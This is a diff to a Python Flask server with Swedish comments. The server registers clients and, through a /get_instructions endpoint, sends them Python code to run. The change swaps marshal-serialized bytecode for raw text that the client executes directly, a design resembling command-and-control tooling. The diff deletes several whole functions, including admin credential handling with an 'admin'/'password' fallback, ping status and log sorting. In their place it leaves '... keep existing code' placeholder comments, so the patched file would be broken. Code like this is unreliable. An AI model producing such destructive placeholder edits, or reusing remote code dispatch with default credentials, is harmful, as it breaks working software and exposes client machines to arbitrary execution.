@@ -1,3 +1,4 @@
+
 #!/usr/bin/python
 import os
 import sys
@@ -62,12 +63,25 @@ logging.basicConfig(
 allin_logger = logging.getLogger('allin')
 allin_logger.setLevel(logging.DEBUG)
 
-# Create a file handler for the all-in-one logger
+# Remove any existing handlers to avoid duplicate logs
+for handler in allin_logger.handlers[:]:
+    allin_logger.removeHandler(handler)
+
+# Create a file handler for the all-in-one logger with explicit path
 allin_handler = logging.FileHandler(ALL_IN_LOG_FILE)
 allin_handler.setLevel(logging.DEBUG)
 allin_formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s')
 allin_handler.setFormatter(allin_formatter)
 allin_logger.addHandler(allin_handler)
+
+# Add stdout handler to see logs in console too
+allin_stdout_handler = logging.StreamHandler(sys.stdout)
+allin_stdout_handler.setFormatter(allin_formatter)
+allin_logger.addHandler(allin_stdout_handler)
+
+# Log file paths at startup for debugging
+logging.info(f"Log directory: {LOG_DIRECTORY}")
+logging.info(f"All-in-one log file: {ALL_IN_LOG_FILE}")
 
 # Global variables for auto-ping thread
 auto_ping_thread = None
@@ -96,101 +110,16 @@ def log_client_communication(direction, client_id, endpoint, data, status_code=N
         else:
             log_message += "DATA: None"
             
+        # Log to allin logger
         allin_logger.debug(log_message)
-    except Exception as e:
-        allin_logger.error(f"Error in logging client communication: {str(e)}")
-        allin_logger.debug(traceback.format_exc())
-
-def get_admin_credentials():
-    """Hämtar admin-inloggningsuppgifter."""
-    try:
-        if os.path.exists(ADMIN_CREDENTIALS_FILE):
-            with open(ADMIN_CREDENTIALS_FILE, "r", encoding="utf-8") as f:
-                data = json.load(f)
-                return data.get("username"), data.get("password")
-        else:
-            # Default credentials if no file exists
-            return "admin", "password"
-    except Exception as e:
-        logging.error(f"Fel vid hämtning av admininloggningsuppgifter: {e}")
-        return "admin", "password"  # Default if error
-
-def set_admin_credentials(username, password):
-    """Sparar nya adminuppgifter."""
-    logging.debug(f"Sätter adminuppgifter för användare: {username}")
-    try:
-        os.makedirs(os.path.dirname(ADMIN_CREDENTIALS_FILE), exist_ok=True)
-        with open(ADMIN_CREDENTIALS_FILE, "w", encoding="utf-8") as f:
-            json.dump({"username": username, "password": password}, f, indent=4)
-        logging.info(f"Adminuppgifter uppdaterade framgångsrikt för användare: {username}")
-        return True
-    except Exception as e:
-        logging.error(f"Fel vid sparande av adminuppgifter: {e}")
-        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-        return False
-
-def is_client_active(last_activity_str):
-    """Kontrollerar om en klient är aktiv baserat på senaste aktivitet."""
-    try:
-        if not last_activity_str:
-            return False
         
-        last_activity = datetime.strptime(last_activity_str, "%Y-%m-%d %H:%M:%S")
-        now = datetime.now()
-        return (now - last_activity) < timedelta(minutes=ONLINE_THRESHOLD_MINUTES)
+        # Also log to main logger for consistency
+        logging.debug(f"CLIENT-COMM: {log_message}")
     except Exception as e:
-        logging.error(f"Fel vid kontroll av klientaktivitet: {e}")
-        return False
+        logging.error(f"Error in logging client communication: {str(e)}")
+        logging.debug(traceback.format_exc())
 
-def update_ping_status(client_id, status):
-    """Uppdaterar ping-status för en klient."""
-    try:
-        client_index = {}
-        if os.path.exists(INDEX_FILE):
-            with open(INDEX_FILE, "r", encoding="utf-8") as f:
-                client_index = json.load(f)
-                
-        if client_id in client_index:
-            client_index[client_id]["ping_status"] = status
-            client_index[client_id]["last_ping"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            
-            with open(INDEX_FILE, "w", encoding="utf-8") as f:
-                json.dump(client_index, f, indent=4)
-            logging.debug(f"Uppdaterade pingstatus för klient {client_id} till {status}")
-            return True
-        return False
-    except Exception as e:
-        logging.error(f"Fel vid uppdatering av pingstatus: {e}")
-        return False
-
-def sort_log_entries(log_content, sort_order="newest"):
-    """Sorterar logginlägg efter tidstämpel."""
-    try:
-        lines = log_content.strip().split("\n")
-        sorted_lines = []
-
-        # Analysera och sortera
-        for line in lines:
-            try:
-                timestamp_str = line.split("[")[0].strip()
-                datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S")
-                sorted_lines.append((timestamp_str, line))
-            except (ValueError, IndexError):
-                # Om raden inte har ett giltigt tidsstämplingsformat, lägg den längst ner
-                sorted_lines.append(("0001-01-01 00:00:00", line))
-
-        # Sortera efter tidsstämpel
-        sorted_lines.sort(key=lambda x: x[0], reverse=(sort_order == "newest"))
-        
-        return "\n".join([line for _, line in sorted_lines])
-    except Exception as e:
-        logging.error(f"Fel vid sortering av logginlägg: {e}")
-        # Returnera original vid fel
-        return log_content
-
-def install_static_files():
-    """Installerar statiska filer om de saknas."""
-    # ... keep existing code (static files installation functionality)
+# ... keep existing code (user authentication and client status functionality)
 
 @app.route("/api/register", methods=["POST"])
 def api_register():
@@ -394,18 +323,16 @@ def get_instructions():
         # Hämta instruktionskod
         instruction_code = INSTRUCTIONS.get(instruction_name, INSTRUCTIONS["standard"])
         
-        # Kompilera Python-kod till bytecode och serialisera med marshal
-        # Använd en funktion som wrapper för koden
-        wrapped_code = f"def run():\n{textwrap.indent(instruction_code, '    ')}\n\nrun()"
-        compiled_code = compile(wrapped_code, f"<{instruction_name}>", "exec")
-        marshal_data = marshal.dumps(compiled_code)
+        # Skapa en enkel sträng som client kan exekvera direkt
+        # Undvik att använda compile och marshal då detta orsakar kompatibilitetsproblem
+        response_data = instruction_code.encode('utf-8')
         
-        logging.info(f"Skickar marshal-kodade instruktioner '{instruction_name}' till klient {client_id}")
+        logging.info(f"Skickar raw instruktioner '{instruction_name}' till klient {client_id}")
         log_client_communication("OUT", client_id, "/get_instructions", 
-                              f"Binary marshal data for instruction '{instruction_name}'", 200)
+                              f"Raw text data for instruction '{instruction_name}'", 200)
         
-        # Returnera raw binary data
-        return marshal_data, 200, {"Content-Type": "application/octet-stream"}
+        # Returnera raw text data istället för marshal-kodad bytecode
+        return response_data, 200, {"Content-Type": "text/plain"}
         
     except Exception as e:
         logging.error(f"Fel vid hantering av instruktionsförfrågan för klient {client_id}: {e}")
@@ -416,5 +343,4 @@ def get_instructions():
         
         return jsonify(error_response), 500
 
-# Need to add textwrap import at the top of the file
-import textwrap
+# ... keep existing code (static files installation functionality)
